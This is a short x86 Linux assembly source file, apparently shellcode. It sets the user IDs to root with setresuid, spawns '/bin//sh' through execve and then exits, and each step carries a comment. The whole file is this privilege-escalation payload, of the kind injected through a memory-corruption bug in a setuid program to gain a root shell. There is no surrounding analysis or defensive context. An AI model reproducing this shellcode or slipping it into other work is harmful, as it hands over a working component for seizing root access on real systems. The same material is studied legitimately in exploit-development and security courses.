global _start

section .text

_start:
    ; Zeroes register eax ~ edx
    xor eax, eax
    xor ebx, ebx
    xor ecx, ecx 
    xor edx, edx 

setresuid:
    mov al, 0xa4    ; Syscall # for setresuid()
    int 0x80        ; Calls kernel

popShell:
    xor eax, eax    ; Zeroes eax

    push eax        ; "\x00"
    push "//sh"     ; "//sh\x00"
    push "/bin"     ; "/bin//sh\x00"
    
    mov al, 0xb     ; Syscall # for execve()
    mov ebx, esp    ; ebx = "/bin//sh\x00"
    int 0x80        ; Calls kernel

exit:
    mov al, 0x1     ; Syscall # for exit()
    xor ebx, ebx    ; ebx = 0
    int 0x80        ; Calls kernel
